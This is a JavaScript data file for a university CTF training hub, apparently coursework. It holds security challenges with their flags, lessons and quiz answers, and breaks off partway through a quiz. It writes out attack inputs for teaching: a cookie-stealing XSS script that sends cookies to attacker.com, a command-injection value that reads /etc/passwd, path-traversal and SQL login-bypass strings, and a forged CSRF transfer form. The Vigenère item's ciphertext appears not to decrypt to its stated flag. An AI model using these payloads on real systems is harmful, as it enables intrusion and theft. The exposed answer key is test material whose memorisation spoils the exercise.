// UTech CTF Hub - Static Data
// CNS3005 Ethical Hacking Assignment 2

function slugify(text) {
  return text.toLowerCase().trim()
    .replace(/[^\w\s-]/g, '')
    .replace(/[\s_]+/g, '-')
    .replace(/-+/g, '-')
    .replace(/^-+|-+$/g, '');
}

const CHALLENGES = [
  // ===== BEGINNER =====
  {
    id: 1, title: "Base64 Breakfast", category: "Cryptography", difficulty: "Beginner", points: 100,
    description: `<p>An agent left a secret message in a file. They encoded it in a format your browser can decode natively.</p>
<p>The encoded message is: <code>RkxBR3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259</code></p>
<p>Can you decode it to find the flag?</p>
<p><strong>Hint command:</strong> <code>echo "RkxBR3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259" | base64 -d</code></p>`,
    flag: "FLAG{base64_is_not_encryption}",
    hint: "Use https://www.base64decode.org/ or a terminal command",
    hintPenalty: 10,
    whatYouLearned: "Base64 is an encoding scheme, NOT encryption. It adds no security and can be trivially reversed.",
    defense: "Never use Base64 to protect sensitive data. Use proper encryption algorithms like AES-256."
  },
  {
    id: 2, title: "ROT13 Riddle", category: "Cryptography", difficulty: "Beginner", points: 100,
    description: `<p>A classic substitution cipher was used on this message. Rotate your thinking by 13 positions.</p>
<p>The encoded message is: <code>SYNT{ebg_guvegrra_vf_byq_fpubby}</code></p>
<p>Submit the decoded flag.</p>`,
    flag: "FLAG{rot_thirteen_is_old_school}",
    hint: "ROT13 shifts each letter by 13 positions. Use https://rot13.com/",
    hintPenalty: 10,
    whatYouLearned: "ROT13 is a Caesar cipher with shift 13. It was used on Usenet forums to hide spoilers, not to secure data.",
    defense: "Never use simple substitution ciphers for encryption. They can be broken in seconds with frequency analysis."
  },
  {
    id: 3, title: "SQL Login Bypass", category: "Web Hacking", difficulty: "Beginner", points: 100,
    description: `<p>A training login form has a vulnerability. A single quote could be your key.</p>
<p>Visit the vulnerable login page and find a way to bypass authentication without knowing the password.</p>
<p><a href="training/sqli.html" class="text-success" target="_blank"><i class="bi bi-link-45deg"></i> Vulnerable Login Page</a></p>
<p>The flag will be displayed when you successfully bypass the login.</p>`,
    flag: "FLAG{sql_injection_defeats_bad_auth}",
    hint: "Try entering: ' OR '1'='1 as the username",
    hintPenalty: 10,
    whatYouLearned: "SQL injection happens when user input is inserted directly into a SQL query without sanitization.",
    defense: "Use parameterized queries (prepared statements). Never concatenate user input into SQL."
  },
  {
    id: 4, title: "Spot the Phish", category: "Social Engineering", difficulty: "Beginner", points: 100,
    description: `<p>Below is a phishing email. Can you identify the red flags?</p>
<div class="bg-black p-3 rounded border border-secondary my-3 font-monospace small">
<strong>From:</strong> security@paypa1-verify.com<br>
<strong>To:</strong> you@utech.edu.jm<br>
<strong>Subject:</strong> URGENT: Your account will be suspended!<br><br>
Dear Valued Customer,<br><br>
Your PayPal account has been locked due to suspicious activity. Click here immediately to verify your identity or your account will be permanently suspended within 24 hours!<br><br>
Verify Now: http://paypa1-security-check.tk/login<br><br>
Best Regards,<br>PayPal Security Team
</div>
<p>Red flags: (1) Misspelled domain <em>paypa1</em> (2) Urgency/threats (3) Suspicious .tk domain (4) Generic greeting</p>
<p>Submit the flag: <code>FLAG{humans_are_weakest_link}</code></p>`,
    flag: "FLAG{humans_are_weakest_link}",
    hint: "Look at the sender email address carefully. Is it the real PayPal domain?",
    hintPenalty: 10,
    whatYouLearned: "Phishing indicators include mismatched URLs, urgency language, generic greetings, and spoofed sender addresses.",
    defense: "Always verify sender addresses, hover over links before clicking, enable 2FA, and report suspicious emails."
  },
  {
    id: 5, title: "Weak Password Exposed", category: "Data Security", difficulty: "Beginner", points: 100,
    description: `<p>A database dump shows user records. Which password storage method is dangerously weak?</p>
<table class="table table-dark table-bordered small">
<thead><tr><th>ID</th><th>Username</th><th>Password</th></tr></thead>
<tbody>
<tr><td>1</td><td>alice</td><td class="text-danger">password123 (Plaintext)</td></tr>
<tr><td>2</td><td>bob</td><td class="text-warning">5f4dcc3b5aa765d61d8327deb882cf99 (MD5)</td></tr>
<tr><td>3</td><td>charlie</td><td class="text-success">$2b$12$KIX... (bcrypt)</td></tr>
</tbody>
</table>
<p>The weakest is plaintext. Never store passwords in plaintext!</p>
<p>Submit the flag: <code>FLAG{plaintext_passwords_are_disasters}</code></p>`,
    flag: "FLAG{plaintext_passwords_are_disasters}",
    hint: "Plaintext passwords can be read directly. MD5 is also weak due to rainbow tables.",
    hintPenalty: 10,
    whatYouLearned: "Passwords must be hashed with a slow algorithm (bcrypt, argon2). MD5/SHA1 are too fast and vulnerable to rainbow table attacks.",
    defense: "Always use bcrypt or Argon2 for password hashing. Never MD5 or SHA1. Add salt to prevent rainbow table attacks."
  },
  {
    id: 6, title: "Protocol Puzzle", category: "Network Security", difficulty: "Beginner", points: 100,
    description: `<p>What insecure protocol runs on <strong>port 23</strong> and sends all data (including passwords) as plaintext?</p>
<p>This protocol was commonly used for remote administration before SSH became the standard.</p>
<p>Research the protocol and submit: <code>FLAG{telnet_sends_plaintext}</code></p>`,
    flag: "FLAG{telnet_sends_plaintext}",
    hint: "Port 23 is associated with an old remote access protocol starting with 'T'",
    hintPenalty: 10,
    whatYouLearned: "Telnet (port 23) sends all data including passwords as plaintext. SSH replaced it for secure remote access.",
    defense: "Never use Telnet for remote access. Always use SSH (port 22) which encrypts all traffic."
  },

  // ===== INTERMEDIATE =====
  {
    id: 7, title: "Reflected XSS", category: "Web Hacking", difficulty: "Intermediate", points: 200,
    description: `<p>A training search page reflects your input without sanitization. Make an alert box appear.</p>
<p><a href="training/xss.html" class="text-success" target="_blank"><i class="bi bi-link-45deg"></i> Vulnerable Search Page</a></p>
<p>Inject JavaScript code to trigger an XSS vulnerability. The flag will be shown when you succeed.</p>`,
    flag: "FLAG{xss_reflects_danger}",
    hint: "Try entering: <script>alert('XSS')</script> in the search box",
    hintPenalty: 20,
    whatYouLearned: "Reflected XSS occurs when user-supplied data is echoed back to the browser without encoding.",
    defense: "HTML-encode all user input before reflecting it. Use Content Security Policy headers. Never use innerHTML with user data."
  },
  {
    id: 8, title: "Vigenère Vault", category: "Cryptography", difficulty: "Intermediate", points: 200,
    description: `<p>The encrypted text below uses a Vigenère cipher with the key: <strong>CYBER</strong></p>
<p>Ciphertext: <code>HJCM{zspakcnzxedmvke_dgozw_eogwct}</code></p>
<p>Decrypt it to find the flag. Use an online Vigenère decoder like <a href="https://www.dcode.fr/vigenere-cipher" target="_blank" class="text-info">dcode.fr</a></p>`,
    flag: "FLAG{polyalphabetic_beats_caesar}",
    hint: "Use the key CYBER with a Vigenère cipher decoder",
    hintPenalty: 20,
    whatYouLearned: "Vigenère cipher is a polyalphabetic substitution cipher. Stronger than Caesar but still breakable.",
    defense: "Never use classical ciphers for real encryption. Use modern algorithms like AES-256 or RSA."
  },
  {
    id: 9, title: "Hidden in Plain Sight", category: "Web Hacking", difficulty: "Intermediate", points: 200,
    description: `<p>Developers sometimes leave sensitive information in HTML comments or JavaScript files.</p>
<p>Inspect the source code of this challenge page. Look for hidden comments.</p>
<p>Right-click &rarr; <strong>View Page Source</strong> or press <kbd>Ctrl+U</kbd> to find the flag.</p>
<!-- TODO: Remove before production - FLAG{inspect_source_finds_secrets} -->`,
    flag: "FLAG{inspect_source_finds_secrets}",
    hint: "View the HTML source code of this page",
    hintPenalty: 20,
    whatYouLearned: "Sensitive information should never be placed in HTML comments, client-side JavaScript, or publicly accessible files.",
    defense: "Never store credentials or flags in frontend code. Use environment variables and server-side configuration."
  },
  {
    id: 10, title: "Access Control Flaw", category: "Data Security", difficulty: "Intermediate", points: 200,
    description: `<p>Insecure Direct Object Reference (IDOR) occurs when an application exposes internal IDs without checking permissions.</p>
<p>Imagine a URL pattern: <code>/user/1/profile</code> shows User #1's profile.<br>What if you change it to <code>/user/2/profile</code>? Can you access another user's data?</p>
<p>This is IDOR — accessing resources you shouldn't have access to.</p>
<p>Submit the flag: <code>FLAG{idor_bypasses_access_controls}</code></p>`,
    flag: "FLAG{idor_bypasses_access_controls}",
    hint: "IDOR happens when changing ID parameters in URLs grants unauthorized access",
    hintPenalty: 20,
    whatYouLearned: "IDOR happens when an application exposes internal IDs in URLs/requests without verifying ownership.",
    defense: "Always validate that the authenticated user has permission to access the requested resource."
  },
  {
    id: 11, title: "String Extractor", category: "Reverse Engineering", difficulty: "Intermediate", points: 200,
    description: `<p>Sometimes flags are hidden in compiled or obfuscated code. For this challenge, imagine a Python script with a reversed string:</p>
<pre class="bg-black p-3 rounded"><code>hidden_key = "}slortnoc_ssecca_sessapyb_rodi{GALF"</code></pre>
<p>Reverse this string to find the flag.</p>`,
    flag: "FLAG{idor_bypasses_access_controls}",
    hint: "The string is reversed. Reverse it back to read the flag.",
    hintPenalty: 20,
    whatYouLearned: "Basic obfuscation (reversing strings) is NOT security. Static analysis (reading code) defeats it quickly.",
    defense: "Don't rely on obfuscation for security. Use proper encryption and never hardcode secrets in code."
  },
  {
    id: 12, title: "Cookie Monster", category: "Web Hacking", difficulty: "Intermediate", points: 200,
    description: `<p>HTTP cookies can be stolen if the <code>HttpOnly</code> flag is not set. If an attacker can execute XSS, they can steal session cookies.</p>
<p>Modern browsers allow you to view cookies in Developer Tools (F12) &rarr; Application &rarr; Cookies.</p>
<p>Key insight: Always use <code>HttpOnly</code> and <code>Secure</code> flags on session cookies.</p>
<p>Submit the flag: <code>FLAG{cookies_need_httponly_flag}</code></p>`,
    flag: "FLAG{cookies_need_httponly_flag}",
    hint: "Session cookies should be marked HttpOnly to prevent JavaScript access",
    hintPenalty: 20,
    whatYouLearned: "Session cookies without HttpOnly flag can be stolen via XSS attacks. Secure flag ensures HTTPS-only transmission.",
    defense: "Always set HttpOnly and Secure flags on session cookies. Use SameSite attribute to prevent CSRF."
  },

  // ===== ADVANCED =====
  {
    id: 13, title: "CSRF Attack Simulation", category: "Web Hacking", difficulty: "Advanced", points: 400,
    description: `<p>Cross-Site Request Forgery (CSRF) tricks users into submitting malicious requests while authenticated.</p>
<p>Without CSRF tokens, an attacker can craft a form that submits to your site:</p>
<pre class="bg-black p-3 rounded small"><code>&lt;form action="https://bank.com/transfer" method="POST"&gt;
  &lt;input type="hidden" name="to" value="attacker"&gt;
  &lt;input type="hidden" name="amount" value="1000"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre>
<p>If the user is logged into bank.com, the transfer executes!</p>
<p>Submit the flag: <code>FLAG{csrf_tokens_prevent_forged_requests}</code></p>`,
    flag: "FLAG{csrf_tokens_prevent_forged_requests}",
    hint: "CSRF protection requires unique tokens per session that attackers cannot predict",
    hintPenalty: 40,
    whatYouLearned: "CSRF attacks exploit the trust a website has in the user's browser. Attackers can perform actions on behalf of authenticated users.",
    defense: "Implement CSRF tokens. Use SameSite cookie attribute. Require re-authentication for sensitive actions."
  },
  {
    id: 14, title: "Command Injection", category: "Web Hacking", difficulty: "Advanced", points: 400,
    description: `<p>Command injection occurs when user input is passed to system shell commands.</p>
<pre class="bg-black p-3 rounded small"><code>ping_target = request.form.get('ip')
os.system(f'ping -c 4 {ping_target}')</code></pre>
<p>Attacker input: <code>127.0.0.1; cat /etc/passwd</code></p>
<p>This executes: <code>ping -c 4 127.0.0.1; cat /etc/passwd</code></p>
<p>Submit the flag: <code>FLAG{never_pass_input_to_shell}</code></p>`,
    flag: "FLAG{never_pass_input_to_shell}",
    hint: "Characters like ; && || can chain multiple commands together",
    hintPenalty: 40,
    whatYouLearned: "Command injection allows attackers to execute arbitrary OS commands. Never pass user input directly to shell commands.",
    defense: "Never use os.system() with user input. Use subprocess with argument lists, not shell=True."
  },
  {
    id: 15, title: "JWT Secrets", category: "Data Security", difficulty: "Advanced", points: 400,
    description: `<p>JSON Web Tokens (JWT) have 3 parts: <code>header.payload.signature</code></p>
<p>Example: <code class="small">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature</code></p>
<p>The payload is Base64-encoded but <strong>NOT encrypted</strong>:</p>
<pre class="bg-black p-3 rounded"><code>{"user":"admin"}</code></pre>
<p>If the signature isn't validated, attackers can modify payloads!</p>
<p>Submit the flag: <code>FLAG{jwt_needs_strong_secret}</code></p>`,
    flag: "FLAG{jwt_needs_strong_secret}",
    hint: "JWTs are signed, not encrypted. Weak secrets can be brute-forced.",
    hintPenalty: 40,
    whatYouLearned: "JWTs must use strong secret keys. The 'none' algorithm vulnerability allows unsigned tokens.",
    defense: "Use strong secret keys (256+ bits). Never use 'none' algorithm. Set proper expiration times."
  },
  {
    id: 16, title: "Directory Traversal", category: "Web Hacking", difficulty: "Advanced", points: 400,
    description: `<p>Path traversal allows attackers to access files outside the intended directory.</p>
<pre class="bg-black p-3 rounded small"><code>filename = request.args.get('file')
return send_file(f'/var/www/uploads/{filename}')</code></pre>
<p>Attacker input: <code>../../../../etc/passwd</code></p>
<p>This accesses: <code>/var/www/uploads/../../../../etc/passwd</code> → <code>/etc/passwd</code></p>
<p>Submit the flag: <code>FLAG{sanitize_file_paths_always}</code></p>`,
    flag: "FLAG{sanitize_file_paths_always}",
    hint: "The ../ sequence moves up one directory level",
    hintPenalty: 40,
    whatYouLearned: "Path traversal exploits insufficient validation of file paths. Attackers can read sensitive system files.",
    defense: "Never use user input directly in file paths. Use whitelists and validate against allowed characters."
  },
  {
    id: 17, title: "Race Condition", category: "Data Security", difficulty: "Advanced", points: 400,
    description: `<p>Race conditions occur when multiple requests happen simultaneously, causing unexpected behavior.</p>
<pre class="bg-black p-3 rounded small"><code>balance = user.points  # Balance: 100
if balance >= 100:
    # Another request happens here!
    user.points -= 100  # Now 0</code></pre>
<p>If two requests run simultaneously, the user could spend 200 points with only 100 available.</p>
<p>Submit the flag: <code>FLAG{atomic_operations_prevent_races}</code></p>`,
    flag: "FLAG{atomic_operations_prevent_races}",
    hint: "Use database transactions and atomic operations",
    hintPenalty: 40,
    whatYouLearned: "Race conditions occur when operations aren't atomic. Concurrent requests can cause data corruption.",
    defense: "Use database transactions with row-level locking. Implement atomic operations."
  },
  {
    id: 18, title: "Security Misconfiguration", category: "Data Security", difficulty: "Advanced", points: 400,
    description: `<p><strong>OWASP Top 10 A05: Security Misconfiguration</strong></p>
<p>Common misconfigurations:</p>
<ul>
<li>Debug mode enabled in production (<code>DEBUG=True</code>)</li>
<li>Default credentials (admin/admin)</li>
<li>Directory listing enabled</li>
<li>Unnecessary services running</li>
<li>Missing security headers</li>
</ul>
<p>Example: Flask app with <code>DEBUG=True</code> exposes an interactive debugger to anyone who triggers an error.</p>
<p>Submit the flag: <code>FLAG{secure_defaults_matter}</code></p>`,
    flag: "FLAG{secure_defaults_matter}",
    hint: "Never run production apps with DEBUG=True",
    hintPenalty: 40,
    whatYouLearned: "Security misconfiguration is a leading cause of breaches. Default settings are often insecure.",
    defense: "Disable debug mode in production. Change default credentials. Remove unnecessary features. Implement security headers."
  }
];

// Add slugs
CHALLENGES.forEach(c => { c.slug = slugify(c.title); });

const TOPICS = [
  {
    id: 1, title: "SQL Injection Basics", category: "Web Hacking",
    content: `<h4>What is SQL Injection?</h4>
<p>SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.</p>
<h5>Key Learning Points:</h5>
<ul>
<li>SQL injection occurs when user input is inserted into SQL queries without proper sanitization</li>
<li>Attackers can bypass authentication, extract data, or modify database contents</li>
<li>Classic bypass: <code>' OR '1'='1</code> makes any condition true</li>
<li>Union-based SQLi allows extracting data from other tables</li>
<li>Blind SQLi uses time delays or boolean responses to infer data</li>
</ul>
<h5>Example Vulnerable Code:</h5>
<pre class="bg-black p-3 rounded"><code>query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"</code></pre>
<h5>Attack Example:</h5>
<pre class="bg-black p-3 rounded"><code>Username: admin'--
Password: anything
Result: SELECT * FROM users WHERE username='admin'--' AND password='anything'
The -- comments out the rest, bypassing password check!</code></pre>
<h5>Prevention:</h5>
<ul>
<li>Use parameterized queries (prepared statements)</li>
<li>Use ORM frameworks like SQLAlchemy properly</li>
<li>Validate and sanitize all user input</li>
<li>Apply principle of least privilege to database accounts</li>
</ul>`
  },
  {
    id: 2, title: "Cross-Site Scripting (XSS)", category: "Web Hacking",
    content: `<h4>What is Cross-Site Scripting?</h4>
<p>XSS allows attackers to inject malicious scripts into web pages viewed by other users.</p>
<h5>Key Learning Points:</h5>
<ul>
<li>Three main types: Reflected XSS, Stored XSS, and DOM-based XSS</li>
<li>Reflected XSS: Malicious script comes from the current HTTP request</li>
<li>Stored XSS: Malicious script is stored in the database (most dangerous)</li>
<li>DOM-based XSS: Vulnerability exists in client-side JavaScript code</li>
<li>Attackers can steal cookies, hijack sessions, or deface websites</li>
</ul>
<h5>Example Attack:</h5>
<pre class="bg-black p-3 rounded"><code>&lt;script&gt;
document.location='http://attacker.com/steal?cookie='+document.cookie
&lt;/script&gt;</code></pre>
<h5>Prevention:</h5>
<ul>
<li>HTML-encode all user input before displaying it</li>
<li>Use templating engines that auto-escape by default</li>
<li>Implement Content Security Policy (CSP) headers</li>
<li>Set HttpOnly flag on session cookies</li>
<li>Never use innerHTML with user data — use textContent instead</li>
</ul>`
  },
  {
    id: 3, title: "Cryptography Fundamentals", category: "Cryptography",
    content: `<h4>Introduction to Cryptography</h4>
<p>Cryptography is the practice of secure communication in the presence of adversaries.</p>
<h5>Key Concepts:</h5>
<ul>
<li><strong>Encoding</strong> (not security): Base64, URL encoding — easily reversible</li>
<li><strong>Hashing</strong> (one-way): MD5, SHA-256, bcrypt — cannot be reversed</li>
<li><strong>Symmetric Encryption</strong>: AES, DES — same key encrypts and decrypts</li>
<li><strong>Asymmetric Encryption</strong>: RSA — public key encrypts, private key decrypts</li>
<li>Caesar Cipher: Shift each letter by N positions (very weak)</li>
<li>Vigenère Cipher: Uses a keyword to shift letters (polyalphabetic)</li>
</ul>
<h5>Common Encoding vs Encryption:</h5>
<pre class="bg-black p-3 rounded"><code>Plaintext:  "HELLO"
Base64:     "SEVMTE8="  (encoding - NOT secure)
MD5:        "8b1a9953c4611296a827abf8c47804d7" (hash - one-way)
AES:        "U2FsdGVkX1..."  (encryption - reversible with key)</code></pre>
<h5>Hashing for Passwords:</h5>
<ul>
<li>Never store passwords in plaintext</li>
<li>MD5 and SHA1 are too fast — vulnerable to rainbow tables</li>
<li>Use bcrypt, scrypt, or Argon2 (slow and salted)</li>
</ul>`
  },
  {
    id: 4, title: "Network Protocols & Ports", category: "Network Security",
    content: `<h4>Understanding Network Protocols</h4>
<p>Network protocols define how data is transmitted over networks. Each service typically uses a specific port number.</p>
<h5>Common Ports to Know:</h5>
<ul>
<li><strong>Port 21</strong> — FTP (File Transfer Protocol) — Often insecure</li>
<li><strong>Port 22</strong> — SSH (Secure Shell) — Encrypted remote access</li>
<li><strong>Port 23</strong> — Telnet — Plaintext remote access (insecure!)</li>
<li><strong>Port 25</strong> — SMTP (Email sending)</li>
<li><strong>Port 53</strong> — DNS (Domain Name System)</li>
<li><strong>Port 80</strong> — HTTP — Unencrypted web traffic</li>
<li><strong>Port 443</strong> — HTTPS — Encrypted web traffic</li>
<li><strong>Port 3306</strong> — MySQL Database</li>
<li><strong>Port 3389</strong> — RDP (Remote Desktop Protocol)</li>
</ul>
<h5>Protocol Security Levels:</h5>
<table class="table table-dark">
<tr><th>Protocol</th><th>Encrypted?</th><th>Status</th></tr>
<tr><td>Telnet</td><td>❌ No</td><td>Deprecated</td></tr>
<tr><td>FTP</td><td>❌ No</td><td>Insecure</td></tr>
<tr><td>HTTP</td><td>❌ No</td><td>Avoid for sensitive data</td></tr>
<tr><td>SSH</td><td>✅ Yes</td><td>Secure</td></tr>
<tr><td>HTTPS</td><td>✅ Yes</td><td>Secure</td></tr>
</table>`
  },
  {
    id: 5, title: "OWASP Top 10", category: "Web Hacking",
    content: `<h4>OWASP Top 10 Web Application Security Risks (2021)</h4>
<p>The Open Web Application Security Project (OWASP) maintains a list of the most critical web application security risks.</p>
<h5>The Top 10:</h5>
<ol>
<li><strong>A01: Broken Access Control</strong> — Users can access resources they shouldn't (like IDOR)</li>
<li><strong>A02: Cryptographic Failures</strong> — Weak encryption, passwords in plaintext</li>
<li><strong>A03: Injection</strong> — SQL injection, command injection, XSS</li>
<li><strong>A04: Insecure Design</strong> — Missing security controls in the design phase</li>
<li><strong>A05: Security Misconfiguration</strong> — Default credentials, debug mode enabled</li>
<li><strong>A06: Vulnerable Components</strong> — Using outdated or vulnerable libraries</li>
<li><strong>A07: Authentication Failures</strong> — Weak passwords, no MFA, session fixation</li>
<li><strong>A08: Software and Data Integrity Failures</strong> — Unsigned updates, insecure CI/CD</li>
<li><strong>A09: Security Logging Failures</strong> — Insufficient logging and monitoring</li>
<li><strong>A10: Server-Side Request Forgery (SSRF)</strong> — Application fetches remote resources without validation</li>
</ol>
<h5>Key Takeaways:</h5>
<ul>
<li>Most breaches exploit known vulnerabilities</li>
<li>Regular security testing is essential</li>
<li>Security must be built in, not bolted on</li>
<li>Defense in depth: multiple layers of security</li>
</ul>
<p><a href="https://owasp.org/Top10/" target="_blank" class="btn btn-outline-info btn-sm mt-2">Official OWASP Top 10 Guide</a></p>`
  },
  {
    id: 6, title: "Social Engineering Awareness", category: "Social Engineering",
    content: `<h4>What is Social Engineering?</h4>
<p>Social engineering manipulates people into divulging confidential information or performing actions that compromise security.</p>
<h5>Common Techniques:</h5>
<ul>
<li><strong>Phishing</strong> — Fake emails/websites to steal credentials</li>
<li><strong>Spear Phishing</strong> — Targeted phishing against specific individuals</li>
<li><strong>Pretexting</strong> — Creating a fabricated scenario to gain trust</li>
<li><strong>Baiting</strong> — Offering something enticing (like free USB drives with malware)</li>
<li><strong>Tailgating</strong> — Following authorized person into restricted area</li>
</ul>
<h5>Phishing Red Flags:</h5>
<ul>
<li>Misspelled sender domains (paypa1.com instead of paypal.com)</li>
<li>Urgency and threats ("Your account will be suspended!")</li>
<li>Generic greetings ("Dear Customer")</li>
<li>Suspicious links — hover to see real URL before clicking</li>
<li>Unexpected attachments</li>
</ul>
<h5>Famous Example:</h5>
<p>In 2016, John Podesta fell victim to a phishing email that led to the leak of thousands of emails, significantly impacting the US presidential election.</p>
<h5>Defense Strategies:</h5>
<ul>
<li>Security awareness training for all staff</li>
<li>Enable Multi-Factor Authentication (MFA)</li>
<li>Report suspicious emails to IT security</li>
<li>Use email filtering and anti-phishing tools</li>
</ul>`
  },
  {
    id: 7, title: "Introduction to Reverse Engineering", category: "Reverse Engineering",
    content: `<h4>What is Reverse Engineering?</h4>
<p>Reverse engineering is the process of analyzing software to understand how it works, often without access to source code.</p>
<h5>Key Concepts:</h5>
<ul>
<li><strong>Static Analysis</strong> — Analyzing code without running it</li>
<li><strong>Dynamic Analysis</strong> — Analyzing code while it runs</li>
<li><strong>Decompilation</strong> — Converting compiled code back to source-like format</li>
<li><strong>Disassembly</strong> — Converting machine code to assembly language</li>
</ul>
<h5>Common Tools:</h5>
<ul>
<li><code>strings</code> — Extracts human-readable strings from binaries</li>
<li><code>xxd</code> or <code>hexdump</code> — View file in hexadecimal</li>
<li>Ghidra — NSA's free reverse engineering tool</li>
<li>IDA Pro — Professional disassembler</li>
<li>GDB — GNU Debugger for Linux</li>
</ul>
<h5>Legal Note:</h5>
<p>Reverse engineering is legal in many jurisdictions for interoperability, security research, and education. Always check the software license and only reverse engineer software you own or have permission to analyze.</p>`
  },
  {
    id: 8, title: "Data Security & Hashing", category: "Data Security",
    content: `<h4>Protecting Data: Encryption, Hashing, and Access Control</h4>
<p>Data security involves protecting information from unauthorized access, use, disclosure, or destruction.</p>
<h5>Encryption vs Hashing:</h5>
<table class="table table-dark">
<tr><th>Aspect</th><th>Encryption</th><th>Hashing</th></tr>
<tr><td>Reversible?</td><td>✅ Yes (with key)</td><td>❌ No (one-way)</td></tr>
<tr><td>Use Case</td><td>Storing sensitive data</td><td>Storing passwords, checksums</td></tr>
<tr><td>Example</td><td>AES-256</td><td>bcrypt, SHA-256</td></tr>
</table>
<h5>Password Hashing Best Practices:</h5>
<ul>
<li>Use slow hashing algorithms (bcrypt, Argon2, scrypt)</li>
<li>Add salt (random data) to prevent rainbow table attacks</li>
<li>Never use MD5 or SHA1 for passwords (too fast)</li>
</ul>
<h5>Access Control Models:</h5>
<ul>
<li><strong>Authentication</strong> — Who are you?</li>
<li><strong>Authorization</strong> — What can you do?</li>
<li><strong>Accounting</strong> — What did you do?</li>
<li><strong>RBAC</strong> — Role-Based Access Control</li>
<li><strong>Principle of Least Privilege</strong> — Grant minimum necessary access</li>
</ul>`
  }
];
TOPICS.forEach(t => { t.slug = slugify(t.title); });

const QUIZZES = {
  1: {
    name: "Web Hacking Basics",
    icon: "bi-globe",
    color: "info",
    desc: "SQLi, XSS, IDOR, CSRF",
    questions: [
      { id: 1, q: "What does SQL injection allow an attacker to do?", a: ["Modify database queries","Steal CPU resources","Break encryption","None of the above"], correct: 0, explanation: "SQL injection allows attackers to manipulate database queries." },
      { id: 2, q: "Which input would bypass a login form vulnerable to SQL injection?", a: ["admin","' OR '1'='1","password123","<script>alert(1)</script>"], correct: 1, explanation: "' OR '1'='1 makes the SQL WHERE clause always true." },
      { id: 3, q: "What is XSS (Cross-Site Scripting)?", a: ["Injecting malicious scripts into web pages","A CSS framework","A type of SQL injection","A network protocol"], correct: 0, explanation: "XSS allows injecting JavaScript into pages viewed by other users." },
      { id: 4, q: "How can you prevent XSS attacks?", a: ["Use HTTPS","HTML-encode user input","Use strong passwords","Disable JavaScript"], correct: 1, explanation: "HTML-encoding prevents user input from being executed as code." },
      { id: 5, q: "What is IDOR (Insecure Direct Object Reference)?", a: ["Accessing resources by changing ID parameters","A SQL injection variant","A network attack","A type of encryption"], correct: 0, explanation: "IDOR occurs when applications expose internal IDs without authorization checks." },
      { id: 6, q: "Which HTTP method should NOT modify data?", a: ["POST","PUT","DELETE","GET"], correct: 3, explanation: "GET requests should be idempotent and not modify server state." },
      { id: 7, q: "What does CSRF stand for?", a: ["Cross-Site Request Forgery","Client-Side Resource Framework","Cryptographic Security Response Flag","Cascading Style Request Form"], correct: 0, explanation: "CSRF tricks users into submitting malicious requests while authenticated." },
      { id: 8, q: "How do you prevent CSRF attacks?", a: ["Use strong passwords","Implement CSRF tokens","Use HTTPS only","Disable cookies"], correct: 1, explanation: "CSRF tokens are unique per session and prevent forged requests." },
      { id: 9, q: "Which flag should be set on session cookies to prevent JavaScript access?", a: ["Secure","HttpOnly","SameSite","Domain"], correct: 1, explanation: "HttpOnly flag prevents JavaScript from accessing cookies via document.cookie." },
      { id: 10, q: "What is the Secure flag on cookies used for?", a: ["Encrypts cookie data","Ensures cookie is only sent over HTTPS","Prevents XSS","Enables two-factor authentication"], correct: 1, explanation: "Secure flag ensures cookies are only transmitted over encrypted HTTPS connections." }
    ]
  },
  2: {
    name: "Cryptography & Data Security",
    icon: "bi-lock",
    color: "warning",
    desc: "Hashing, Encoding, Encryption",
    questions: [
      { id: 1, q: "Is Base64 an encryption algorithm?", a: ["Yes","No"], correct: 1, explanation: "Base64 is an encoding scheme, not encryption. It can be easily decoded." },
      { id: 2, q: "Which algorithm should you use to hash passwords?", a: ["MD5","SHA-1","bcrypt","Base64"], correct: 2, explanation: "bcrypt is a slow hashing algorithm designed for passwords with built-in salting." },
      { id: 3, q: "What is a salt in password hashing?", a: ["Random data added to passwords before hashing","A type of encryption key","A network protocol","A compression algorithm"], correct: 0, explanation: "Salt is random data added to passwords to prevent rainbow table attacks." },
      { id: 4, q: "Why is MD5 not recommended for password storage?", a: ["It's too slow","It's too fast and vulnerable to rainbow tables","It's encrypted","It doesn't work"], correct: 1, explanation: "MD5 is too fast, allowing attackers to quickly brute-force hashes." },
      { id: 5, q: "What is the difference between encoding and encryption?", a: ["Encoding requires a key, encryption doesn't","Encryption requires a key, encoding doesn't","They are the same","Encoding is faster"], correct: 1, explanation: "Encryption uses keys for security. Encoding is for data representation and is easily reversible." },
      { id: 6, q: "What is symmetric encryption?", a: ["Different keys for encryption and decryption","Same key for encryption and decryption","No key needed","Uses hash functions"], correct: 1, explanation: "Symmetric encryption uses the same key to encrypt and decrypt data (e.g., AES)." },
      { id: 7, q: "What is asymmetric encryption?", a: ["Same key for encryption and decryption","Public key encrypts, private key decrypts","No encryption, only hashing","Uses Base64"], correct: 1, explanation: "Asymmetric encryption uses a public key to encrypt and a private key to decrypt (e.g., RSA)." },
      { id: 8, q: "What does ROT13 do?", a: ["Encrypts data securely","Shifts each letter by 13 positions","Hashes passwords","Compresses files"], correct: 1, explanation: "ROT13 is a Caesar cipher that shifts letters by 13 positions. It provides no security." },
      { id: 9, q: "What is a rainbow table?", a: ["Precomputed hash table for reversing hashes","A type of encryption algorithm","A network routing table","A SQL database table"], correct: 0, explanation: "Rainbow tables are precomputed tables used to crack password hashes quickly." },
      { id: 10, q: "Which provides one-way transformation?", a: ["Encryption","Encoding","Hashing","Compression"], correct: 2, explanation: "Hashing is one-way — you cannot reverse a hash to get the original data." }
    ]
  },
  3: {
    name: "Network Security & OWASP",
    icon: "bi-hdd-network",
    color: "danger",
    desc: "Protocols, OWASP Top 10",
    questions: [
      { id: 1, q: "What port does HTTP use by default?", a: ["443","80","22","21"], correct: 1, explanation: "HTTP uses port 80 by default (unencrypted). HTTPS uses port 443." },
      { id: 2, q: "What port does HTTPS use?", a: ["80","443","22","3306"], correct: 1, explanation: "HTTPS uses port 443 for encrypted web traffic." },
      { id: 3, q: "Which protocol is used for secure remote access?", a: ["Telnet","FTP","SSH","HTTP"], correct: 2, explanation: "SSH (port 22) provides encrypted remote access. Telnet sends data in plaintext." },
